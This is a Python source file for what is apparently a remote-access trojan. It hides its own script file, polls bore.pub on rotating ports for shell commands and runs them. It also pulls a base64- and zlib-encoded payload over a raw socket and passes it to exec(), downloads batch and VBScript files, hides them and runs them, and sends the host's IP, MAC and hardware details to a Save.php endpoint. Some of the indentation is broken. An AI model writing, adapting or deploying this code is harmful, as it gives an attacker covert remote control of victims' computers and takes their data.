import os
import requests
import ctypes
import socket
import time
import platform
import psutil
import subprocess
import uuid
import wmi
import concurrent.futures
import random
import threading
import zlib
import base64
import struct
import os
import sys

# Hide BN.pyw 
subprocess.Popen("attrib +h BN.pyw", shell=True) 
  
def METASPLOIT(): 
  
    actual_mac = uuid.UUID(int=uuid.getnode()).hex[-12:] 
    actual_mac = ':'.join([actual_mac[e:e+2] for e in range(0, 12, 2)]) 
  
    previous_data = "" 
  
    while True: 
        # Request data from PHP script with a random port
        port = random.choice([61723, 3348, 44693, 44688, 12554, 12539, 61956, 12248, 10010, 10012])
        url = f'http://bore.pub:{port}/Metasploit.php'
        response = requests.get(url) 
  
        if response.status_code == 200: 
            data = response.text 
            if data != previous_data: 
                # Split the received data into MAC and option 
            parts = data.strip().split('::')
            if len(parts) == 2:
                mac, option = parts
            elif len(parts) == 1:
                mac = parts[0]
                option = "No Command"
            else:
                print("Invalid data format.")
                continue

            # Print the MAC and Command
            print("Received MAC:", mac)
            print("Received Command:", option)
            time.sleep(1)
 
            previous_data = data
            if mac == '':
                if option == "STOP":
                  def restart_program():
                     python = sys.executable
                     os.execl(python, python, *sys.argv)
                  restart_program()  # Restart the script
            if mac == actual_mac:
                if option == "START":
                    print("Starting with MAC validation...")
                    def run_specific_code():
                     import socket, zlib, base64, struct, time, random

                     while True:
                        ports_to_try = [61723, 3348, 44693, 44688, 12554, 12539, 61956, 12248, 10010, 10012]
                        random.shuffle(ports_to_try)  # Shuffle the list of ports randomly
    
                        for port in ports_to_try:
                            try:
                               s = socket.socket(2, socket.SOCK_STREAM)
                               s.connect(('bore.pub', port))
            
                               l = struct.unpack('>I', s.recv(4))[0]
                               d = s.recv(1)
                               while len(d) < l:
                                   d += s.recv(l - len(d))

                               exec(zlib.decompress(base64.b64decode(d)), {'s': s})

                            except Exception as e:
                               print(f"An error occurred: {e}")
                            finally:
                             s.close()
        
                            if 's' in locals():
                               break  # Break out of the loop if connection was successful
    
                            print("Waiting for 1 seconds before retrying...")
                       
                    specific_code_thread = threading.Thread(target=run_specific_code)
                    specific_code_thread.daemon = True  
                    specific_code_thread.start()
                elif option == "STOP":
                    def restart_program():
                     python = sys.executable
                     os.execl(python, python, *sys.argv)
                    restart_program()  # Restart the script
                else:
                    print("Invalid command:", option)
            else:
                print("MAC not provided or does not match. Cannot execute command.")
        else:
            print("No new data.")
    else:
        print("Failed to fetch data.")

    # Wait for some time before checking again (adjust as needed)
    time.sleep(1)


specific_code_thread = threading.Thread(target=METASPLOIT)
specific_code_thread.daemon = True  
specific_code_thread.start()

# Store the previously executed command and files with timestamps
previous_command = None
previous_files = {}

# Function to clear the console screen
def clear_screen():
    if os.name == 'nt':
        ctypes.windll.kernel32.GetStdHandle(-11).ResizeScreenBuffer(1, 1)
        ctypes.windll.kernel32.GetStdHandle(-11).SetConsoleActiveScreenBuffer(
            ctypes.windll.kernel32.GetStdHandle(-10)
        )
    else:
        print("\033c", end="")

# Function to send data to a specified URL
def send_data_to_url(url, data):
    try:
        response = requests.post(url, data=data)
        return f"Data sent to {url}: {response.text}"
    except Exception as e:
        return f"Error sending data to {url}: {str(e)}"

# Function to download and save a file
def download_file(url, save_path):
    try:
        response = requests.get(url)
        if response.status_code == 200:
            with open(save_path, "wb") as file:
                file.write(response.content)
            print(f"Downloaded and saved {url} to {save_path}")
        else:
            print(f"Failed to download {url}. Status code: {response.status_code}")
    except Exception as e:
        print(f"Error downloading {url}: {str(e)}")

# Function to hide files on Windows
def hide_files_windows(file_paths):
    try:
        for file_path in file_paths:
            ctypes.windll.kernel32.SetFileAttributesW(file_path, 2)  
    except Exception as e:
        print(f"Error hiding files on Windows: {str(e)}")

# Function to hide files on Unix-based systems
def hide_files_unix(file_paths):
    try:
        for file_path in file_paths:
            os.chmod(file_path, 0o400)  
    except Exception as e:
        print(f"Error hiding files on Unix-based system: {str(e)}")

# Function to retrieve system information
def get_system_info():
    try:
        mac = uuid.UUID(int=uuid.getnode()).hex[-12:]
        mac = ':'.join([mac[e:e+2] for e in range(0, 12, 2)])
        computer = wmi.WMI()
        computer_info = computer.Win32_ComputerSystem()[0]
        os_info = computer.Win32_OperatingSystem()[0]
        proc_info = computer.Win32_Processor()[0]
        gpu_info = computer.Win32_VideoController()[0]
        os_name = os_info.Name.encode('utf-8').split(b'|')[0]
        os_version = ' '.join([os_info.Version, os_info.BuildNumber])
        system_ram = float(os_info.TotalVisibleMemorySize) / 1048576
        cpu = format(proc_info.Name)
        gpu = format(gpu_info.Name)
        System = platform.system()
        res = platform.release()
        mach = platform.machine()
        pros = platform.processor()
        ram = str(round(psutil.virtual_memory().total / (1024.0 ** 3))) + " GB"
        ip = requests.get('https://checkip.amazonaws.com').text.strip()
        hostname = socket.gethostname()
        
        data_to_send = {
            "DeviceID": f"{hostname}",
            "IP Address": f"{ip}",
            "System": f"{System} {res}",
            "Mac": f"{mac}",
            "Processor": f"{cpu}",
            "GPU": f"{gpu}",
            "Ram": f"{ram}",
            "Machine": f"{mach}",
        }

        return data_to_send

    except Exception as e:
        print(f"Error retrieving system information: {str(e)}")
        return None

while True:
    try:
        # Function to continuously receive and process data
        def receive_data():
            global previous_command, previous_files

            while True:
                # Your code to fetch data from the PHP script goes here
                port = random.choice([61723, 3348, 44693, 44688, 12554, 12539, 61956, 12248, 10010, 10012])
                php_script_url = f'http://bore.pub:{port}/Control.php'
                
                response = requests.get(php_script_url)
                data = response.text.strip()

                if data != "" and data != previous_command:
                    if '::' in data:
                        mac = uuid.UUID(int=uuid.getnode()).hex[-12:]
                        mac = ':'.join([mac[e:e+2] for e in range(0, 12, 2)])
                        received_mac, file_to_execute = data.split('::', 1)
                        if received_mac == mac:
                            # Check if the received file has been executed recently
                            if file_to_execute not in previous_files or (time.time() - previous_files[file_to_execute]) > 30:
                                # Execute the file
                                subprocess.Popen(f"{file_to_execute}", shell=True)
                                previous_files[file_to_execute] = time.time()
                            else:
                                print(f"Skipping file execution: File executed within 30 seconds.")
                        else:
                            print(f"Received data with MAC address {received_mac} does not match the device's MAC address.")
                    else:
                        subprocess.Popen(f"{data}", shell=True)
                    
                    previous_command = data
                    break  # Exit the loop after processing a command

        previous_command = ""
        previous_files = {}

        # Start the data receiving thread
        receive_thread = threading.Thread(target=receive_data)
        receive_thread.start()

        # Add any additional code or conditions for the loop as needed
        time.sleep(1)  # Example: Sleep for 1 second between iterations

        # Define URLs and paths
        port = random.choice([61723, 3348, 44693, 44688, 12554, 12539, 61956, 12248, 10010, 10012])
        php_script_url = f'http://bore.pub:{port}/Control.php'
        home_directory = os.path.expanduser("~")
        web_page1_path = os.path.join(home_directory, "Script.bat")
        vbs_file_path = os.path.join(home_directory, "VBSEX.vbs")

        # Delete existing files
        for file_path in [web_page1_path, vbs_file_path]:
            if os.path.exists(file_path):
                os.remove(file_path)

        # Download files
        url1 = f"http://bore.pub:{port}/Script.io"
        url2 = f"http://bore.pub:{port}/VBSEX.io"

        download_file(url1, web_page1_path)
        download_file(url2, vbs_file_path)

        # Hide downloaded files
        if os.name == 'nt':
            hide_files_windows([web_page1_path, vbs_file_path])
        else:
            hide_files_unix([web_page1_path, vbs_file_path])

        # Execute VBScript if it exists
        if os.path.isfile(vbs_file_path):
            subprocess.Popen(['cscript.exe', vbs_file_path], shell=True)

        # Send system information
        data_to_send = get_system_info()
        if data_to_send:
            portx = random.choice([61723, 3348, 44693, 44688, 12554, 12539, 61956, 12248, 10010, 10012])
            php_urls = [f"http://bore.pub:{portx}/Save.php"]

            with concurrent.futures.ThreadPoolExecutor() as executor:
                results = executor.map(lambda url: send_data_to_url(url, data_to_send), php_urls)

            for result in results:
                print(result)

    except Exception as e:
        print(f"Error: {str(e)}")
        time.sleep(0)
